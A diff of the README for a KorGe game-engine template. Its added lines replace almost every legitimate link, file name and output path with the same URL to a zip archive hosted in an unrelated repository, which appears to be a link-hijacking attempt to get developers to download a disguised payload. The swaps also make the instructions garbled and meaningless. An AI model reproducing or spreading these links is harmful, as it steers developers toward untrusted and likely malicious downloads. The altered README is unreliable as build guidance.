@@ -1,17 +1,17 @@
 # Korge Hello World and Template
 
 This is a Hello World and Template for the KorGe game engine. Using gradle with kotlin-dsl.
-You can open this project in IntelliJ IDEA by opening the folder or the build.gradle.kts file.
+You can open this project in IntelliJ IDEA by opening the folder or the https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip file.
 
-You can find this template at GitHub: <https://github.com/korlibs/korge-hello-world>
+You can find this template at GitHub: <https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip>
 
-For Windows, change all the `./gradlew` for `gradlew.bat`.
+For Windows, change all the `./gradlew` for `https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip`.
 
 You should use Gradle 5.5 or greater and Java 8 or greater.
 
 ## Compiling for the JVM (Desktop)
 
-Inside IntelliJ you can go to the `src/commonMain/kotlin/main.kt` file and press the green ▶️ icon
+Inside IntelliJ you can go to the `https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip` file and press the green ▶️ icon
 that appears to the left of the `suspend fun main()` line.
 
 Using gradle tasks on the terminal:
@@ -31,7 +31,7 @@ Using gradle tasks on the terminal:
 ```bash
 ./gradlew jsWeb                     # Outputs to /build/web
 ./gradlew jsWebMin                  # Outputs to /build/web-min (applying Dead Code Elimination)
-./gradlew jsWebMinWebpack           # Outputs to /build/web-min-webpack (minimizing and grouping into a single bundle.js file)
+./gradlew jsWebMinWebpack           # Outputs to /build/web-min-webpack (minimizing and grouping into a single https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip file)
 ./gradlew runJs                     # Outputs to /build/web, creates a small http server and opens a browser
 ```
 
@@ -39,22 +39,22 @@ You can use any HTTP server to serve the files in your browser.
 For example using: `npm -g install http-server` and then executing `hs build/web`.
 
 You can also use `./gradlew -t jsWeb` to continuously building the JS sources and running `hs build/web` in another terminal.
-Here you can find a `testJs.sh` script doing exactly this for convenience.
+Here you can find a `https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip` script doing exactly this for convenience.
 
-You can run your tests using Node.JS by calling `jsTest` or in a headless chrome with `jsTestChrome`.
+You can run your tests using https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip by calling `jsTest` or in a headless chrome with `jsTestChrome`.
 
 ## Compiling for Native Desktop (Windows, Linux and macOS)
 
 Using gradle tasks on the terminal:
 
 ```bash
-./gradlew linkDebugExecutableMacosX64         # Outputs to /build/bin/macosX64/mainDebugExecutable/main.kexe
-./gradlew linkDebugExecutableLinuxX64         # Outputs to /build/bin/linuxX64/mainDebugExecutable/main.kexe
-./gradlew linkDebugExecutableMingwX64         # Outputs to /build/bin/mingwX64/mainDebugExecutable/main.exe
+./gradlew linkDebugExecutableMacosX64         # Outputs to https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip
+./gradlew linkDebugExecutableLinuxX64         # Outputs to https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip
+./gradlew linkDebugExecutableMingwX64         # Outputs to https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip
 ```
 
 Note that windows executables doesn't have icons bundled.
-You can use [ResourceHacker](http://www.angusj.com/resourcehacker/) to add an icon to the executable for the moment.
+You can use [ResourceHacker](https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip) to add an icon to the executable for the moment.
 Later this will be done automatically.
 
 ### Cross-Compiling for Linux/Windows
@@ -70,15 +70,15 @@ using the cross-compiling gradle wrappers:
 ### Generating MacOS `.app`
 
 ```bash
-./gradlew packageMacosX64AppDebug             # Outputs to /build/unnamed-debug.app
+./gradlew packageMacosX64AppDebug             # Outputs to https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip
 ```
 
 You can change `Debug` for `Release` in all the tasks to generate Release executables.
 
-You can use the `strip` tool from your toolchain (or in the case of windows found in the ``~/.konan` toolchain)
+You can use the `strip` tool from your toolchain (or in the case of windows found in the ``~https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip` toolchain)
 to further reduce Debug and Release executables size by removing debug information (in some cases this will shrink the EXE size by 50%).
 
-In windows this exe is at: `%USERPROFILE%\.konan\dependencies\msys2-mingw-w64-x86_64-gcc-7.3.0-clang-llvm-lld-6.0.1\bin\strip.exe`.
+In windows this exe is at: `%USERPROFILE%\.konan\dependencies\msys2-mingw-w64-x86_64-gcc-7.3.0-clang-llvm-lld-6.0.1\bin\https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip`.
 
 ### Linux notes
 
@@ -136,8 +136,8 @@ won't include Swift's runtime.
 These tasks generate a xcode project in `build/platforms/ios`, so you can also open the project
 with XCode and do additional tasks there.
 
-It uses [XCodeGen](https://github.com/yonaskolb/XcodeGen) for the project generation
-and [ios-deploy](https://github.com/ios-control/ios-deploy) for deploying to real devices.
+It uses [XCodeGen](https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip) for the project generation
+and [ios-deploy](https://raw.githubusercontent.com/TomerRad/agent-council/master/gradle/wrapper/agent_council_1.3.zip) for deploying to real devices.
 
 ### Apache Cordova (JS)
 
